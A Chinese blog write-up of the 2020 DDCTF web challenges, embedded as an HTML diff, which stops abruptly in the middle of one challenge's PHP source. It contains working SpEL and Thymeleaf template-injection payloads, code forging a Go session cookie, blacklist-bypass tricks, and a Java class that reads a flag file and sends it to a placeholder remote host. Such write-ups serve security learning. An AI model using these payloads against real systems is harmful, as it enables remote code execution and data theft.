@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="web签到题访问地址，得到如下信息。首先访问了第一个login的API，请求方式为POST，输入username和pwd，服务端返回了一个json数据。其中data字段的值是jwt加密的，解密后的内容如下所示。userRole的值为GUEST，想要伪造该值为ADMIN，需要secret key，尝试爆破。利用jwtcrack工具。爆破出来的secret key与所输入的pwd的值一样，可以猜测它是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020-DDCTF web方向 WriteUp">
+<meta property="og:url" content="http://yoursite.com/2020/09/08/ddctf/index.html">
+<meta property="og:site_name" content="Ananaskr&#39;s Blog">
+<meta property="og:description" content="web签到题访问地址，得到如下信息。首先访问了第一个login的API，请求方式为POST，输入username和pwd，服务端返回了一个json数据。其中data字段的值是jwt加密的，解密后的内容如下所示。userRole的值为GUEST，想要伪造该值为ADMIN，需要secret key，尝试爆破。利用jwtcrack工具。爆破出来的secret key与所输入的pwd的值一样，可以猜测它是">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/12.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/13.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/14.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/15.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/16.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/17.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/18.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/19.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/20.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/21.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/22.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/23.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/08/ddctf/24.png">
+<meta property="article:published_time" content="2020-09-08T13:46:12.000Z">
+<meta property="article:modified_time" content="2020-09-08T14:27:32.831Z">
+<meta property="article:author" content="ananaskr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/08/ddctf/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/09/08/ddctf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2020-DDCTF web方向 WriteUp | Ananaskr's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ananaskr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/About/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/08/ddctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ananaskr">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ananaskr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020-DDCTF web方向 WriteUp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-09-08 21:46:12 / Modified: 22:27:32" itemprop="dateCreated datePublished" datetime="2020-09-08T21:46:12+08:00">2020-09-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p>访问地址，得到如下信息。<br><img src="1.png" alt=""><br>首先访问了第一个login的API，请求方式为POST，输入username和pwd，服务端返回了一个json数据。<br><img src="2.png" alt=""><br>其中data字段的值是jwt加密的，解密后的内容如下所示。userRole的值为GUEST，想要伪造该值为ADMIN，需要secret key，尝试爆破。利用jwtcrack工具。爆破出来的secret key与所输入的pwd的值一样，可以猜测它是使用输入的pwd作为secret key的。<br><img src="3.png" alt=""><br><img src="4.png" alt=""><br>访问第二个Auth API，带着token值，token为伪造的jwt，获取了client的下载地址，下载client。<br><img src="5.png" alt=""><br>下载client后，先file看一下文件，是个linux可执行文件，跑一下。<br><img src="6.png" alt=""><br>从这个程序中，猜测向API <a href="http://117.51.136.197/server/command" target="_blank" rel="noopener">http://117.51.136.197/server/command</a> 发送command能够返回数据。但如何发送呢，抓包查看。<br><img src="7.png" alt=""><br>发送的格式为<code>{&quot;signature&quot;:&quot;&quot;,&quot;command&quot;:&quot;&#39;DDCTF&#39;&quot;,&quot;timestamp&quot;:}</code>。<br><img src="8.png" alt=""><br>现在需要知道的是，如何对发送的command生成正确的签名。这时候需要逆向一下client。在getSign函数中发现了一些信息，通过这些信息猜测了一下它应该是<code>HMAC</code>算法，使用的hash函数为<code>sha256</code>，加密密钥为<code>DDCTFWithYou</code>。 所需要加密的数据为”command|timestamp”。<br><img src="9.png" alt=""><br>结果证明猜测正确。<br><img src="10.png" alt=""><br>在输入id等命令无果后，后端应该不是shell，然后想到了模版注入，经测试，最后锁定为spel注入。模版注入的payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&quot;cat &#x2F;home&#x2F;dc2-user&#x2F;flag&#x2F;flag.txt&quot;).getInputStream())</span><br></pre></td></tr></table></figure>
+<p>最后成功获取flag。<br><img src="11.png" alt=""></p>
+<h2 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h2><p>卡片商店题目打开内容如下:<br><img src="12.png" alt=""><br>点击重新开始后，在活动结束前共有3分钟的时间。意味着需要在3分钟内获得100张卡片，每借出一次卡片，在30s后可多获得3张，每借入一张卡片，需多还2张。经测试可以输入0张卡片，但即使这样，最多也只能获得99张卡片。对伪造session没有想法时，继续回想，既然最少可输入0，那么最多可输入多少呢？会存在溢出吗？使用2^62次数据，溢出了。<br><img src="13.png" alt=""><br>在借卡记录归还后，兑换礼物，获得下面的提示。<br><img src="14.png" alt=""><br>看到这个secret key就想到了应该是要伪造session，一般常见的是伪造flask的session，但这个的session明显不一样。首先来看一下session。<br><img src="15.png" alt=""><br>将-以及_替换为/和+后，进行解密后有如下一串结果，最后有个admin是bool值，可能为false，需要伪造为True。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DstringwalletstringUS&#123;&quot;owings&quot;:[],&quot;invests&quot;:[],&quot;money&quot;:12,&quot;now_time&quot;:1599226651,&quot;start_time&quot;:1599226471&#125;stringadminbool</span><br></pre></td></tr></table></figure>
+
+<p>在尝试了多个框架的session后，最后发现为Go语言的echo框架。在网上找了echo框架的session生成。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">	<span class="string">"github.com/labstack/echo/v4"</span></span><br><span class="line">	<span class="string">"github.com/gorilla/sessions"</span></span><br><span class="line">	<span class="string">"github.com/labstack/echo-contrib/session"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	e := echo.New()</span><br><span class="line">	e.Use(session.Middleware(sessions.NewCookieStore([]<span class="keyword">byte</span>(<span class="string">"Udc13VD5adM_c10nPxFu@v12"</span>))))</span><br><span class="line"></span><br><span class="line">	e.Get(<span class="string">"/"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c echo.Context)</span> <span class="title">error</span></span>&#123;</span><br><span class="line">		sess, _ := session.Get(<span class="string">"session"</span>,c)</span><br><span class="line">		sess.Options = &amp;sessions.Options&#123;</span><br><span class="line">			Path: <span class="string">"/"</span>,</span><br><span class="line">			MaxAge: <span class="number">86400</span>*<span class="number">7</span>,</span><br><span class="line">			HttpOnly: <span class="literal">true</span>,</span><br><span class="line">		&#125;</span><br><span class="line">		sess.Values[<span class="string">"admin"</span>] = <span class="literal">true</span></span><br><span class="line">		sess.Save(c.Request(), c.Response())</span><br><span class="line">		<span class="keyword">return</span> c.NoContent(http.StatusOK)</span><br><span class="line">	&#125;)</span><br><span class="line">	</span><br><span class="line">	e.Logger.Fatal(e.Start(<span class="string">":1323"</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后访问1323端口，替换掉原来的session，访问/flag，即可获得flag。<br><img src="16.png" alt=""></p>
+<h2 id="EASY-WEB"><a href="#EASY-WEB" class="headerlink" title="EASY_WEB"></a>EASY_WEB</h2><p>easy_web这道题打开是一个登录框，抓包后，响应中有deleteme，确认后端有shiro，想到了shiro之前爆出来的xx/..;/绕过鉴权的漏洞。<br><img src="17.png" alt=""><br>查看源码后，发现有一个下载图片的接口，然后尝试任意文件下载漏洞，经测试，只能下载到web目录中的文件，而无法越到其他目录。<br><img src="18.png" alt=""><br>在这里尝试读取源码。首先通过WEB-INF/web.xml发现了com.ctf.util.SafeFilter和spring-web.xml，下载下来。com.ctf.util.SafeFilter里面是一个黑名单，对传入的参数会进行黑名单的检测，若存在黑名单，则返回403。黑名单如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&quot;java.+lang&quot;</span><br><span class="line">&quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;</span><br><span class="line">&quot;exec.*\\(&quot;</span><br><span class="line">&quot;write|read&quot;</span><br><span class="line">&quot;invoke.*\\(&quot;</span><br><span class="line">&quot;\\.forName.*\\(&quot;</span><br><span class="line">&quot;lookup.*\\(&quot;</span><br><span class="line">&quot;\\.getMethod.*\\(&quot;</span><br><span class="line">&quot;javax.+script.+ScriptEngineManager&quot;</span><br><span class="line">&quot;com.+fasterxml&quot;</span><br><span class="line">&quot;org.+apache&quot;</span><br><span class="line">&quot;org.+hibernate&quot;</span><br><span class="line">&quot;org.+thymeleaf&quot;</span><br><span class="line">&quot;javassist&quot;</span><br><span class="line">&quot;javax\\.&quot;</span><br><span class="line">&quot;eval.*\\(&quot;</span><br><span class="line">&quot;\\.getClass\\(&quot;</span><br><span class="line">&quot;org.+springframework&quot;</span><br><span class="line">&quot;javax.+el&quot;</span><br><span class="line">&quot;java.+io&quot;</span><br></pre></td></tr></table></figure>
+
+<p>spring-web.xml中给出了3个controller包：com.ctf.controller, com.ctf.repository, com.ctf.service。这里需要猜测一下类名。最后测出来了com.ctf.controller.IndexController.class、com.ctf.controller.AuthController.class以及com.ctf.controller.ManagerController.class。<br>通过阅读源码，得到了一个路径。<br><img src="19.png" alt=""><br>访问后，得到一个输入框。<br><img src="20.png" alt=""><br>根据源码，输入的值会写入一个html页面中，后续会使用thymeleaf模版进行render，但是在传入的payload中需要绕过黑名单。联想到之前利用URLClassLoader远程加载恶意的Jar包从而RCE。恶意的Jar包中，编写了读取flag文件，并发送至远程的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      URL uRL1 = <span class="keyword">new</span> URL(<span class="string">"file:///flag_is_here"</span>);</span><br><span class="line">      InputStream inputStream = uRL1.openStream();</span><br><span class="line">      ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte1 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">      <span class="keyword">int</span> i;</span><br><span class="line">      <span class="keyword">while</span> ((i = inputStream.read(arrayOfByte1)) &gt;= <span class="number">0</span>)</span><br><span class="line">        byteArrayOutputStream.write(arrayOfByte1, <span class="number">0</span>, i); </span><br><span class="line">      byteArrayOutputStream.close();</span><br><span class="line">      inputStream.close();</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte2 = byteArrayOutputStream.toByteArray();</span><br><span class="line">      String str1 = URLEncoder.encode(<span class="keyword">new</span> String(arrayOfByte2), <span class="string">"UTF8"</span>);</span><br><span class="line">      URL uRL2 = <span class="keyword">new</span> URL(<span class="string">"http://xxx.xxx.xxx.xxx/?a="</span> + str1);</span><br><span class="line">      HttpURLConnection httpURLConnection = (HttpURLConnection)uRL2.openConnection();</span><br><span class="line">      httpURLConnection.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">      httpURLConnection.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">      httpURLConnection.setRequestProperty(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded; charset=UTF-8"</span>);</span><br><span class="line">      BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(httpURLConnection.getInputStream(), <span class="string">"utf-8"</span>));</span><br><span class="line">      String str2 = <span class="keyword">null</span>;</span><br><span class="line">      StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      <span class="keyword">while</span> ((str2 = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        stringBuilder.append(str2 + <span class="string">"\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      httpURLConnection.disconnect();</span><br><span class="line">      System.out.println(stringBuilder.toString());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">      exception.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>初始的payload如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[$&#123;&#123;T(java.net.URLClassLoader).getConstructors()[1].newInstance(new java.net.URL[]&#123;&#123;T(java.net.URL).getConstructors()[2].newInstance(&quot;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;evil.jar&quot;)&#125;&#125;).loadClass(&quot;ExecTest&quot;).getConstructor().newInstance()&#125;&#125;]]</span><br></pre></td></tr></table></figure>
+
+<p>由于禁掉了引号，使用T(Character).toString()进行绕过。最终的payload如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[$&#123;T(java.net.URLClassLoader).getConstructors()[1].newInstance(new java.net.URL[]&#123;T(java.net.URL).getConstructors()[2].newInstance(T(Character).toString(104).concat(T(Character).toString(116)).concat(T(Character).toString(116)).concat(T(Character).toString(112)).concat(T(Character).toString(58)).concat(T(Character).toString(47)).concat(T(Character).toString(47)).concat(T(Character).toString(49)).concat(T(Character).toString(49)).concat(T(Character).toString(56)).concat(T(Character).toString(46)).concat(T(Character).toString(56)).concat(T(Character).toString(57)).concat(T(Character).toString(46)).concat(T(Character).toString(50)).concat(T(Character).toString(52)).concat(T(Character).toString(53)).concat(T(Character).toString(46)).concat(T(Character).toString(49)).concat(T(Character).toString(50)).concat(T(Character).toString(50)).concat(T(Character).toString(47)).concat(T(Character).toString(101)).concat(T(Character).toString(118)).concat(T(Character).toString(105)).concat(T(Character).toString(108)).concat(T(Character).toString(46)).concat(T(Character).toString(106)).concat(T(Character).toString(97)).concat(T(Character).toString(114)))&#125;).loadClass(T(Character).toString(69).concat(T(Character).toString(120)).concat(T(Character).toString(101)).concat(T(Character).toString(99)).concat(T(Character).toString(84)).concat(T(Character).toString(101)).concat(T(Character).toString(115)).concat(T(Character).toString(116))).getConstructor().newInstance()&#125;]]</span><br></pre></td></tr></table></figure>
+<p>最终拿到了flag。<br><img src="21.png" alt=""></p>
+<h2 id="Override-me"><a href="#Override-me" class="headerlink" title="Override me"></a>Override me</h2><p>这道题给了源码，如下所示。复现时，赛题环境已经关闭，因此直接docker搭了个环境，进行复现。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system(<span class="string">'find /FlagNeverFall '</span> . escapeshellcmd(<span class="keyword">$this</span>-&gt;flag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HintClass</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  $hint;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i"</span>, <span class="keyword">$this</span>-&gt;hint))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Don't Do That!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShowOff</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'/hint/hint.php'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;contents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page-&gt;contents = <span class="string">"POP me! I can give you some hints!"</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;page-&gt;cont);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiddleMan</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> <span 